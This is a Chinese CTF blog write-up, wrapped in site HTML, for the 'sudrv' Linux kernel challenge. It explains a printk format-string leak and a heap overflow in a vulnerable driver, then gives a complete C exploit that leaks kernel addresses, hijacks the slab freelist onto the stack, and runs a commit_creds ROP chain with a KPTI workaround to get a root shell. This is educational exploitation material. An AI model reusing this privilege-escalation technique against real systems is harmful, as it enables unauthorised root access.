@@ -1,0 +1,595 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <meta charset="utf-8">
+    
+    <title>教你学内核-sudrv | -NIYAH-</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+    
+
+    
+        <meta property="algolia:search" data-application-id="J7XB8WB9FZ" data-api-key="8f85e3019c85416686ccfe4fc498c065" data-index-name="Niyah">
+    
+
+    
+
+    
+
+    
+        <link rel="icon" href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><text y=%22.9em%22 font-size=%2290%22>/images/nia.jpg</text></svg>">
+    
+
+    
+
+    
+
+    
+<link rel="stylesheet" href="/dist/build.css?v=1629946964125.css">
+
+
+    <script>
+        window.isPost = true
+        window.aomori = {
+            
+            
+            valine: {
+                enable: true,
+                appId: "EWrkUk5e2JLQDjKa82Pt2dVH-gzGzoHsz",
+                appKey: "A0QQmMoivqHI4IF8skQ3ya5X",
+            },
+            
+            
+        }
+        window.aomori_logo_typed_animated = true
+        window.aomori_search_algolia = true
+
+    </script>
+
+<meta name="generator" content="Hexo 5.2.0"><link rel="alternate" href="/atom.xml" title="-NIYAH-" type="application/atom+xml">
+</head>
+
+<body>
+
+    <div class="container">
+    <header class="header">
+        <div class="header-type">
+            
+            <div class="header-type-avatar avatar avatar-sm">
+                <img src="/images/nia.jpg" alt="Niyah">
+            </div>
+            
+            <div class="header-type-inner">
+                
+                    <div id="typed-strings" style="display:none">
+                        <p>-NIYAH-</p>
+                    </div>
+                    <a class="header-type-title" id="typed" href="/"></a>
+                
+    
+                
+            </div>
+        </div>
+        <div class="header-menu">
+            <div class="header-menu-inner">
+                
+                <a href="/">Home</a>
+                
+                <a href="/archives">Archives</a>
+                
+                <a href="/friends">Friends</a>
+                
+                <a href="/about">About</a>
+                
+            </div>
+            <div class="header-menu-social">
+                
+    <a class="social" target="_blank" href="https://github.com/Orcust-Automaton">
+        <box-icon type='logo' name='github'></box-icon>
+    </a>
+
+            </div>
+        </div>
+
+        <div class="header-menu-mobile">
+            <div class="header-menu-mobile-inner" id="mobile-menu-open">
+                <i class="icon icon-menu"></i>
+            </div>
+        </div>
+    </header>
+
+    <div class="header-menu-mobile-menu">
+        <div class="header-menu-mobile-menu-bg"></div>
+        <div class="header-menu-mobile-menu-wrap">
+            <div class="header-menu-mobile-menu-inner">
+                <div class="header-menu-mobile-menu-close" id="mobile-menu-close">
+                    <i class="icon icon-cross"></i>
+                </div>
+                <div class="header-menu-mobile-menu-list">
+                    
+                    <a href="/">Home</a>
+                    
+                    <a href="/archives">Archives</a>
+                    
+                    <a href="/friends">Friends</a>
+                    
+                    <a href="/about">About</a>
+                    
+                </div>
+            </div>
+        </div>
+    </div>
+
+</div>
+
+    <div class="container">
+        <div class="main">
+            <section class="inner">
+                <section class="inner-main">
+                    <div class="post">
+    <article id="post-cla1708c5002da4oqd8sod859" class="article article-type-post" itemscope
+    itemprop="blogPost">
+
+    <div class="article-inner">
+
+        
+          
+        
+        
+        
+
+        
+        <header class="article-header">
+            
+  
+    <h1 class="article-title" itemprop="name">
+      教你学内核-sudrv
+    </h1>
+  
+
+        </header>
+        
+
+        <div class="article-more-info article-more-info-post hairline">
+
+            <div class="article-date">
+  <time datetime="2022-09-30T03:10:27.000Z" itemprop="datePublished">2022-09-30</time>
+</div>
+
+            
+            <div class="article-category">
+                <a class="article-category-link" href="/categories/%E6%95%99%E7%A8%8B/">教程</a>
+            </div>
+            
+
+            
+            <div class="article-tag">
+                <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/C%E8%AF%AD%E8%A8%80/" rel="tag">C语言</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/kernel/" rel="tag">kernel</a></li></ul>
+            </div>
+            
+
+            
+
+        </div>
+
+        <div class="article-entry post-inner-html hairline" itemprop="articleBody">
+            <blockquote>
+<p>确实没鸽</p>
+</blockquote>
+<a id="more"></a>
+<h1 id="sudrv"><a class="markdownIt-Anchor" href="#sudrv">#</a> sudrv</h1>
+<p>自己做出来的第二个 kernel 题目，也是在网上看了很多很多很多东西</p>
+<h2 id="前置知识"><a class="markdownIt-Anchor" href="#前置知识">#</a> 前置知识</h2>
+<p>首先是内核堆块的分配策略</p>
+<p>slab 机制见<a target="_blank" rel="noopener" href="https://blog.csdn.net/lukuen/article/details/6935068">这篇文章</a></p>
+<p>简单的说我这边看到的就是，分配的堆块大小是固定的某些值，这些值通常是 2 的 n 次方根，并且将链表的零散堆块清空后，再分配就是再连续的一整个大块里面，也就是说，你现在申请的地址下面可能就有指向下一个待分配堆块的指针。</p>
+<p>然后是堆的格式化字符串</p>
+<p>同用户态，内核的 printk 也会产生格式化字符串漏洞，并且在最开始启动内核时，有如下一些信息打印出来</p>
+<p><img src="/CTF/%E6%95%99%E4%BD%A0%E5%AD%A6%E5%86%85%E6%A0%B8-sudrv/image-20220922155211641.png" alt="image-20220922155211641"></p>
+<p>因此我们可以直接看到 printk 输出的数据，也可以通过 dmesg 查看数据</p>
+<h2 id="漏洞点"><a class="markdownIt-Anchor" href="#漏洞点">#</a> 漏洞点</h2>
+<p>首先是格式化字符串</p>
+<p><img src="/CTF/%E6%95%99%E4%BD%A0%E5%AD%A6%E5%86%85%E6%A0%B8-sudrv/image-20220922155529433.png" alt="image-20220922155529433"></p>
+<p>然后是 write 没有限制长度，导致可以实现堆溢出</p>
+<p><img src="/CTF/%E6%95%99%E4%BD%A0%E5%AD%A6%E5%86%85%E6%A0%B8-sudrv/image-20220922155805531.png" alt="image-20220922155805531"></p>
+<h2 id="漏洞利用"><a class="markdownIt-Anchor" href="#漏洞利用">#</a> 漏洞利用</h2>
+<p>关于格式化字符串利用，内核里可以通过 % llx 来打印出内容，是直接显示在终端的，但是通过 dmesg 也可以再次查看，那么我们可以重定向一下保存到文件里，再读文件将 leak 出来的 内容弄出来就行。</p>
+<p>之后就是同用户态一样，算偏移，找 gadget</p>
+<p>然后就是堆利用的部分，和用户态的 tcache 类似，修改指针可以直接申请到该内存，并且指针还是连续分布的（，因此堆溢出就可以实现任意地址申请</p>
+<p>那么我们申请的地方就可以是栈，申请到 调用函数的返回地址就行了</p>
+<p>最后是 rop 链的构造，起初我也以为可以直接照搬之前的 rop 链，但是有些 gadget 居然是不一样的，因此重新构造了一些，而且前面还需要执行 signal (SIGSEGV, shell); 在用户态执行 shell ，主要是由于内核开了 KPTI</p>
+<p><a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/kernel-mode/defense/isolation/user-kernel/kpti/">KPTI - Kernel Page Table Isolation - CTF Wiki (ctf-wiki.org)</a></p>
+<pre class="language-shell" data-language="shell"><code class="language-shell">dmesg | grep &#39;page table&#39;</code></pre>
+<p><img src="/CTF/%E6%95%99%E4%BD%A0%E5%AD%A6%E5%86%85%E6%A0%B8-sudrv/image-20220922161647244.png" alt="image-20220922161647244"></p>
+<p>这边提一下泄露出内核地址后，可以通过如下命令得到内核的基地址，然后得到偏移</p>
+<pre class="language-shell" data-language="shell"><code class="language-shell">cat  &#x2F;proc&#x2F;kallsyms | tail -n +1 | head -n 10</code></pre>
+<p><img src="/CTF/%E6%95%99%E4%BD%A0%E5%AD%A6%E5%86%85%E6%A0%B8-sudrv/image-20220922115700052.png" alt="image-20220922115700052"></p>
+<h2 id="最终exp"><a class="markdownIt-Anchor" href="#最终exp">#</a> 最终 exp</h2>
+<p>比较稳定 getshell</p>
+<pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;fcntl.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/stat.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/types.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/ioctl.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;signal.h></span></span>
+
+size_t commit_creds <span class="token operator">=</span> <span class="token number">0x81410</span><span class="token punctuation">;</span>
+size_t prepare_kernel_cred <span class="token operator">=</span> <span class="token number">0x81790</span><span class="token punctuation">;</span>
+size_t pop_rdi_ret <span class="token operator">=</span> <span class="token number">0x1388</span><span class="token punctuation">;</span>
+size_t pop_rdx_ret <span class="token operator">=</span> <span class="token number">0x44f17</span><span class="token punctuation">;</span>
+size_t pop_rcx_ret <span class="token operator">=</span> <span class="token number">0x674ff</span><span class="token punctuation">;</span>
+size_t pop_rbp_ret <span class="token operator">=</span> <span class="token number">0x4ee</span><span class="token punctuation">;</span>
+
+size_t mov_rdi_rax_x_ret <span class="token operator">=</span> <span class="token number">0x9e2959</span><span class="token punctuation">;</span>
+size_t mov_rdi_rax_y_ret <span class="token operator">=</span> <span class="token number">0x1a2cb</span><span class="token punctuation">;</span>
+
+size_t swapgs_popfq_ret <span class="token operator">=</span> <span class="token number">0xa00d5a</span><span class="token punctuation">;</span>
+size_t iretq_ret <span class="token operator">=</span> <span class="token number">0x21762</span><span class="token punctuation">;</span>
+
+size_t vmlinux_base <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
+size_t stack_addr <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
+size_t user_cs<span class="token punctuation">,</span> user_ss<span class="token punctuation">,</span> user_rflags<span class="token punctuation">,</span> user_sp<span class="token punctuation">;</span>
+
+<span class="token keyword">void</span> <span class="token function">info</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>s <span class="token punctuation">,</span> size_t address <span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span>address<span class="token punctuation">)</span> <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\033[32m\033[1m[Info] %s : \033[0m%#lx\n"</span><span class="token punctuation">,</span> s<span class="token punctuation">,</span> address<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">else</span> <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\033[32m\033[1m[Info] %s \033[0m\n"</span><span class="token punctuation">,</span> s<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token keyword">void</span> <span class="token function">error</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>s<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\033[31m\033[1m[Error] %s\n\033[0m"</span> <span class="token punctuation">,</span> s<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token keyword">void</span> <span class="token function">shell</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">getuid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        <span class="token function">error</span><span class="token punctuation">(</span><span class="token string">"Failed to get root"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+    <span class="token function">info</span><span class="token punctuation">(</span><span class="token string">"Get root!"</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">execl</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">,</span><span class="token string">"sh"</span><span class="token punctuation">,</span><span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token keyword">void</span> <span class="token function">save_status</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+    <span class="token function">__asm__</span><span class="token punctuation">(</span>
+        <span class="token string">"mov user_cs, cs;"</span>
+        <span class="token string">"mov user_ss, ss;"</span>
+        <span class="token string">"mov user_sp, rsp;"</span>
+        <span class="token string">"pushf;"</span>
+        <span class="token string">"pop user_rflags;"</span>
+    <span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">info</span><span class="token punctuation">(</span><span class="token string">"status saved!"</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token keyword">void</span> <span class="token function">get_address</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+    FILE<span class="token operator">*</span> fd <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"/tmp/leak"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>fd<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        <span class="token function">error</span><span class="token punctuation">(</span><span class="token string">"Cannot open file /tmp/leak"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+    <span class="token keyword">float</span> leak_f <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
+    <span class="token keyword">char</span> leak_buf<span class="token punctuation">[</span><span class="token number">0x100</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">0x100</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    size_t num <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
+    size_t leak <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
+    
+    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token function">fgets</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token number">0x50</span><span class="token punctuation">,</span> fd<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strstr</span><span class="token punctuation">(</span>buf <span class="token punctuation">,</span> <span class="token string">"vmlinux_leak"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+            <span class="token function">sscanf</span><span class="token punctuation">(</span>buf <span class="token punctuation">,</span> <span class="token string">"%s%f%s%s%lx"</span> <span class="token punctuation">,</span> leak_buf <span class="token punctuation">,</span><span class="token operator">&amp;</span>leak_f<span class="token punctuation">,</span>leak_buf<span class="token punctuation">,</span>leak_buf <span class="token punctuation">,</span> <span class="token operator">&amp;</span>leak<span class="token punctuation">)</span><span class="token punctuation">;</span>
+            vmlinux_base <span class="token operator">=</span>leak <span class="token operator">-</span> <span class="token number">0x1c827f</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strstr</span><span class="token punctuation">(</span>buf <span class="token punctuation">,</span> <span class="token string">"stack_leak"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+            <span class="token function">sscanf</span><span class="token punctuation">(</span>buf <span class="token punctuation">,</span> <span class="token string">"%s%f%s%s%lx"</span> <span class="token punctuation">,</span> leak_buf <span class="token punctuation">,</span><span class="token operator">&amp;</span>leak_f<span class="token punctuation">,</span>leak_buf<span class="token punctuation">,</span>leak_buf <span class="token punctuation">,</span> <span class="token operator">&amp;</span>leak<span class="token punctuation">)</span><span class="token punctuation">;</span>
+            stack_addr <span class="token operator">=</span> leak <span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token keyword">void</span> <span class="token function">set_offset</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+    commit_creds <span class="token operator">+=</span> vmlinux_base<span class="token punctuation">;</span>
+    prepare_kernel_cred <span class="token operator">+=</span> vmlinux_base<span class="token punctuation">;</span>
+
+    pop_rdi_ret <span class="token operator">+=</span> vmlinux_base<span class="token punctuation">;</span>
+    pop_rdx_ret <span class="token operator">+=</span> vmlinux_base<span class="token punctuation">;</span>
+    pop_rcx_ret <span class="token operator">+=</span> vmlinux_base<span class="token punctuation">;</span>
+    pop_rbp_ret <span class="token operator">+=</span> vmlinux_base<span class="token punctuation">;</span>
+
+    mov_rdi_rax_y_ret <span class="token operator">+=</span> vmlinux_base<span class="token punctuation">;</span>
+
+    swapgs_popfq_ret <span class="token operator">+=</span> vmlinux_base<span class="token punctuation">;</span>
+    iretq_ret <span class="token operator">+=</span> vmlinux_base<span class="token punctuation">;</span>
+
+    <span class="token function">info</span><span class="token punctuation">(</span><span class="token string">"commit_creds"</span> <span class="token punctuation">,</span> commit_creds<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">info</span><span class="token punctuation">(</span><span class="token string">"prepare_kernel_cred"</span> <span class="token punctuation">,</span> prepare_kernel_cred<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token comment">// leak:deadbeef,40,40,b,0,ffffffff989c827f,c5d29dd937432d00,2</span>
+
+<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+    
+    <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">0x100</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"%llx,%llx,%llx,%llx,%llx,\nvmlinux_leak: 0x%llx\n,%llx,%llx,%llx,\nstack_leak: 0x%llx\n"</span><span class="token punctuation">;</span>
+    size_t rop<span class="token punctuation">[</span><span class="token number">0x600</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">0</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
+    <span class="token keyword">int</span> i <span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>
+
+    <span class="token function">save_status</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">signal</span><span class="token punctuation">(</span>SIGSEGV<span class="token punctuation">,</span> shell<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token keyword">int</span> fd <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/dev/meizijiutql"</span> <span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token function">ioctl</span><span class="token punctuation">(</span>fd <span class="token punctuation">,</span><span class="token number">0x73311337</span> <span class="token punctuation">,</span> <span class="token number">0xfff</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">write</span><span class="token punctuation">(</span>fd <span class="token punctuation">,</span>buf <span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">ioctl</span><span class="token punctuation">(</span>fd <span class="token punctuation">,</span><span class="token number">0xDEADBEEF</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"dmesg > /tmp/leak"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">get_address</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">set_offset</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token function">info</span><span class="token punctuation">(</span><span class="token string">"vmlinux_base"</span> <span class="token punctuation">,</span> vmlinux_base<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">info</span><span class="token punctuation">(</span><span class="token string">"stack_addr"</span> <span class="token punctuation">,</span> stack_addr<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span><span class="token number">0x100</span> <span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        <span class="token function">ioctl</span><span class="token punctuation">(</span>fd <span class="token punctuation">,</span><span class="token number">0x73311337</span> <span class="token punctuation">,</span> <span class="token number">0xfff</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+
+    size_t write_ret <span class="token operator">=</span> stack_addr <span class="token operator">-</span> <span class="token number">0x88</span> <span class="token punctuation">;</span>
+    size_t buffer<span class="token punctuation">[</span><span class="token number">0x1010</span><span class="token operator">/</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token punctuation">;</span>
+
+    buffer<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x114514</span> <span class="token punctuation">;</span>
+    buffer<span class="token punctuation">[</span><span class="token number">0x1000</span><span class="token operator">/</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">=</span> write_ret <span class="token punctuation">;</span>
+
+    <span class="token function">write</span><span class="token punctuation">(</span>fd <span class="token punctuation">,</span>buffer <span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>buffer<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    
+    <span class="token comment">//commit_creads(prepare_kernel_cred(0));</span>
+    rop<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> pop_rdi_ret<span class="token punctuation">;</span>
+    rop<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
+    rop<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> prepare_kernel_cred<span class="token punctuation">;</span>
+    rop<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> pop_rcx_ret<span class="token punctuation">;</span>
+    rop<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
+    rop<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> mov_rdi_rax_y_ret<span class="token punctuation">;</span>
+    rop<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> commit_creds<span class="token punctuation">;</span>
+
+    rop<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> swapgs_popfq_ret<span class="token punctuation">;</span>
+    rop<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
+    rop<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> iretq_ret<span class="token punctuation">;</span>
+    rop<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>size_t <span class="token punctuation">)</span>shell<span class="token punctuation">;</span>
+    rop<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> user_cs<span class="token punctuation">;</span>
+    rop<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> user_rflags<span class="token punctuation">;</span>
+    rop<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> user_sp<span class="token punctuation">;</span>
+    rop<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> user_ss<span class="token punctuation">;</span>
+
+    <span class="token function">ioctl</span><span class="token punctuation">(</span>fd <span class="token punctuation">,</span><span class="token number">0x73311337</span> <span class="token punctuation">,</span> <span class="token number">0xfff</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">ioctl</span><span class="token punctuation">(</span>fd <span class="token punctuation">,</span><span class="token number">0x73311337</span> <span class="token punctuation">,</span> <span class="token number">0xfff</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token comment">// ioctl(fd ,0xDEADBEEF );</span>
+
+    <span class="token function">write</span><span class="token punctuation">(</span>fd <span class="token punctuation">,</span> rop <span class="token punctuation">,</span><span class="token number">0x100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token punctuation">&#125;</span>
+</code></pre>
+
+        </div>
+
+    </div>
+
+    
+
+    
+
+    
+
+    
+<div class="article-copyright hairline">
+  <p>
+    本作品采用 <a rel="license noopener" target="_blank" href="http://creativecommons.org/licenses/by-nc-nd/4.0/">知识共享署名-非商业性使用-禁止演绎 4.0 国际许可协议</a> 进行许可。
+  </p>
+</div>
+
+
+    
+
+    
+<nav class="article-nav">
+  
+    <a href="/CTF/%E6%95%99%E4%BD%A0%E5%AD%A6%E5%86%85%E6%A0%B8-linux%20kernel%20ROP%20%E4%B8%8B%E7%9A%84%E4%BF%9D%E6%8A%A4%E7%BB%95%E8%BF%87/" id="article-nav-newer" class="article-nav-link-wrap">
+      <div class="article-nav-caption">下一篇</div>
+      <div class="article-nav-title">
+        
+          教你学内核-linux kernel ROP 下的保护绕过
+        
+      </div>
+    </a>
+  
+  
+    <a href="/CTF/%E6%95%99%E4%BD%A0%E5%AD%A6%E5%86%85%E6%A0%B8-qwb-core/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-caption">上一篇</div>
+      <div class="article-nav-title">教你学内核-qwb-core</div>
+    </a>
+  
+</nav>
+
+
+    <section class="share">
+        <div class="share-title">分享</div>
+        <a class="share-item" target="_blank"
+            href="https://twitter.com/share?text=教你学内核-sudrv - -NIYAH-&url=http://niyah.cn/CTF/%E6%95%99%E4%BD%A0%E5%AD%A6%E5%86%85%E6%A0%B8-sudrv/">
+            <box-icon type='logo' name='twitter'></box-icon>
+        </a>
+        <a class="share-item" target="_blank"
+            href="https://www.facebook.com/sharer.php?title=教你学内核-sudrv - -NIYAH-&u=http://niyah.cn/CTF/%E6%95%99%E4%BD%A0%E5%AD%A6%E5%86%85%E6%A0%B8-sudrv/">
+            <box-icon name='facebook-square' type='logo' ></box-icon>
+        </a>
+        <!-- <a class="share-item" target="_blank"
+            href="https://service.weibo.com/share/share.php?title=教你学内核-sudrv - -NIYAH-&url=http://niyah.cn/CTF/%E6%95%99%E4%BD%A0%E5%AD%A6%E5%86%85%E6%A0%B8-sudrv/&pic=">
+            <div class="n-icon n-icon-weibo"></div>
+        </a> -->
+    </section>
+
+</article>
+
+
+
+
+
+
+
+
+<section class="comments">
+    <div id="valine-container"></div>
+</section>
+<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+
+
+
+
+
+</div>
+                </section>
+            </section>
+
+            
+            <aside class="sidebar sidebar-search-fix">
+                
+
+    <div class="search">
+    <div class="has-icon-right">
+        <input type="text" class="form-input" id="search" placeholder="SEARCH" autocomplete="off">
+        <div class="form-icon">
+            <box-icon name='search' color="#3c4859"></box-icon>
+        </div>
+    </div>
+    <div class="search-result" id="search-ps"></div>
+</div>
+
+
+<div class="widget" id="widget">
+    
+      
+  <div class="widget-wrap">
+    <div class="widget-inner">
+      <div class="toc post-toc-html"></div>
+    </div>
+  </div>
+
+    
+      
+  <div class="widget-wrap widget-cate">
+    <div class="widget-title"><span>Categories</span></div>
+    <div class="widget-inner">
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/Binary/">Binary</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%AD%A6%E4%B9%A0/">学习</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%95%99%E7%A8%8B/">教程</a></li></ul>
+    </div>
+  </div>
+
+
+    
+      
+  <div class="widget-wrap widget-tags">
+    <div class="widget-title"><span>Tags</span></div>
+    <div class="widget-inner">
